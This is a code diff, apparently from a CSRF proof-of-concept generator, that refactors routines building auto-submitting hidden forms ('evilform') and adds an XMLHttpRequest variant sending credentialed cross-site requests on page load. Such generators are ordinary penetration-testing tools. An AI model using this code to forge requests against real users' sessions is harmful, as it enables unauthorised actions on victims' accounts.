@@ -5,7 +5,7 @@ interface sendfunc {
 
     send(): boolean;
 
-    sendFunc(): boolean;
+    generateSendFunction(): string;
 }
 
 class formfunc implements sendfunc {
@@ -14,22 +14,40 @@ class formfunc implements sendfunc {
     }
 
     generateHTML(title, bodyhtml): string {
-        return "";
+        let content: string =
+            `${getHTMLheader(title)}
+<body${(isAutoSubmit()) ? ' onload="csrfSubmit();' : ''}>
+${bodyhtml}${(!isAutoSubmit()) ? '<button onclick="csrfSubmit();">submit</button>' : ''}
+${this.generateSendFunction()}
+<p>${title}</p>
+${getHTMLfooter()}
+`;
+        return content;
     }
 
     send(): boolean {
-        return false;
+        const req = getRequest();
+        document.getElementById("stat").innerHTML += "<p>Request sent.</p><p>" + escapeHTML(req['url']) + "</p><p>" + escapeHTML(req['params']) + "</p><hr />";
+        const submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
+        submit();
+        return true;
     }
 
-    sendFunc(): boolean {
-        return false;
+    generateSendFunction(): string {
+        let content = `<script>
+function csrfSubmit(){
+    let submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
+    submit();
+}
+</script>
+`;
+        return content;
     }
-
 }
 
 const forfunc = {
     generate: function () {
-        let ezhtml = "";
+        let ezhtml: string = "";
         const req = getRequest();
         if (req === false) return false;
         ezhtml += '<form target="dummyfrm" name="evilform" action="' + req['url'] + '" method="' + req['method'] + '" enctype="' + req['enctype'] + '">\n';
@@ -47,22 +65,40 @@ const forfunc = {
     },
 
     generateHTML: function (title, bodyhtml) {
-        let content = `${getHTMLheader(title)}
-<body${(isAutoSubmit()) ? ' onload="csrfSubmit();' : ''}>
-${bodyhtml}${(!isAutoSubmit()) ? '<button onclick="csrfSubmit();">submit</button>' : ''}
-${this.sendFunction()}
-<p>${title}</p>
-${getHTMLfooter()}
-`;
+    },
+
+    send: function () {
+    },
+
+
+};
+
+const xhrfunc = {
+    generate: function () {
+        const req = getRequest();
+        if (req === false) return false;
+        let ezhtml = "";
+        ezhtml += "function csrfSubmit(){\n";
+        ezhtml += "let xhr=new XMLHttpRequest();\n";
+        ezhtml += "xhr.open('" + req['method'] + "','" + req['url'] + "');\n";
+        ezhtml += "xhr.withCredentials = true;\n";
+        ezhtml += "xhr.setRequestHeader('Content-Type','" + req['enctype'] + "'";
+        if (req['enctype'] === "multipart/form-data") ezhtml += "+'; boundary=" + req['boundary'] + "'";
+        ezhtml += ");\n";
+        ezhtml += "xhr.send('" + escapeJavascript(getParamsRaw()) + "');\n";
+        ezhtml += "}\n";
+        setEvilTextContent(ezhtml, true);
+        setEvilHTMLcontent(ezhtml);
+        return true;
+    },
+
+    generateHTML: function (title, bodyhtml) {
         let content = getHTMLheader(title);
         content += '<body';
         if (isAutoSubmit()) content += ' onload="csrfSubmit();"';
         content += '>\n';
         content += bodyhtml;
-        if (!isAutoSubmit()) {
-            content += '<button onclick="csrfSubmit();">submit</button>\n';
-        }
-        content += formfunc.sendFunction();
+        if (!isAutoSubmit()) content += '<button onclick="csrfSubmit();">submit</button>\n';
         content += '\n<p>' + title + '</p>\n';
         content += '</body>\n';
         content += getHTMLfooter();
@@ -70,22 +106,9 @@ ${getHTMLfooter()}
     },
 
     send: function () {
-        const req = getRequest();
-        document.getElementById("stat").innerHTML += "<p>Request sent.</p><p>" + escapeHTML(req['url']) + "</p><p>" + escapeHTML(req['params']) + "</p><hr />";
-        const submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
-        submit();
-    },
-
-    sendFunction: function () {
-        let content = '<sc' + 'ript>\n';
-        content += 'function csrfSubmit(){\n';
-        content += 'let submit = HTMLFormElement.prototype["submit"].bind(document.evilform);\n';
-        content += 'submit();\n';
-        content += '}\n';
-        content += '</sc' + 'ript>\n';
-        return content;
+        eval(document.getElementById("evilzone").textContent);
+        csrfSubmit();
     }
-
 };
 
 function getHTMLheader(title = "CSRF PoC") {
